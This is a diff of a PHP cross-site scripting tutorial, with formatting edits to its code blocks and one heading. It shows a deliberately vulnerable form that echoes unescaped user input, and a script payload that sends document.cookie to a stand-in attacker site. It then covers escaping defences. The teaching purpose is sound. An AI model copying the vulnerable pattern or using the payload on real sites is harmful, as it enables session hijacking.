@@ -20,16 +20,16 @@ So let's take a look at a simple form that I have written.
 <!DOCTYPE html>
 <html>
 <body>
-		<h1>Simple PHP Form</h1>
-		<form method="GET" action="<?php echo $_SERVER['PHP_SELF'];?>">
-			Name: <input type="text" name="fname">
-			<input type="submit">
-		</form>
-		<?php
-			if ($_SERVER["REQUEST_METHOD"] == "GET") {
-				echo "<p>Hi " . $_GET['fname'] . "!</p>";
-			}
-		?>
+  <h1>Simple PHP Form</h1>
+  <form method="GET" action="<?php echo $_SERVER['PHP_SELF'];?>">
+    Name: <input type="text" name="fname">
+    <input type="submit">
+  </form>
+  <?php
+    if ($_SERVER["REQUEST_METHOD"] == "GET") {
+      echo "<p>Hi " . $_GET['fname'] . "!</p>";
+    }
+  ?>
 </body>
 </html>
 ```
@@ -44,7 +44,7 @@ After typing my name in the input box, we get the following output.
 
 Now you might be thinking that all is well and good, but what if someone submits the following text as input.
 
-```
+```html
 <b>Abhishek</b>
 ```
 
@@ -54,7 +54,7 @@ We get the following output.
 
 Wait, what? So if you pass in an HTML tag, the output is modified based on the tag. This is because when the PHP code echos the content of 'fname,' the resulting HTML sent back from the server looks like this. 
 
-```
+```html
 <p>Hi <b>Abhishek</b>!</p>
 ```
 
@@ -89,16 +89,15 @@ we get the following output.
 
 Since the cookie is retrievable, the attacker can, once he gets the cookie, log in as the user and wreak havoc. One way the attacker can retrieve the cookies is by setting up a web server and sending the URL with the malicious code to a target. When the user clicks on the link, his/her browser will then send the cookies to the attacker's server. An example of such an URL is as.
 
-```javascript
-http://vulnerable-website?param=<script>window.location="http://attackers-site.com/?cookie=" + document.cookie
-</script>
+```
+http://vulnerable-website?param=<script>window.location="http://attackers-site.com/?cookie=" + document.cookie</script>
 ```
 
 The cookie is sent as a GET value which the attacker can then view on his/her server. 
 
-# Well, how can we prevent the above attack? 
+# Well, how can we prevent XSS? 
 Some of the ways we can prevent XSS are:
-Escaping all dynamic content, i.e., replace any characters that the browser will interpret with something called entities. For example, `<` is replaced with `&lt;`. This means that when the page is returned back to the user, the browser sees `&lt;`,  and renders it instead of interpreting it. Dynamic content is encoded by default by most modern frameworks. The following two functions can be used.
+Escaping all dynamic content, i.e., replace any characters that the browser will interpret with something called entities. For example, `<` is replaced with `&lt;`. This means that when the page is returned back to the user, the browser sees `&lt;`,  and renders it instead of interpreting it. Dynamic content is encoded by default by most modern frameworks. The following two functions can also be used.
 
 ```
 htmlspecialchars(): encodes special characters to HTML entities,
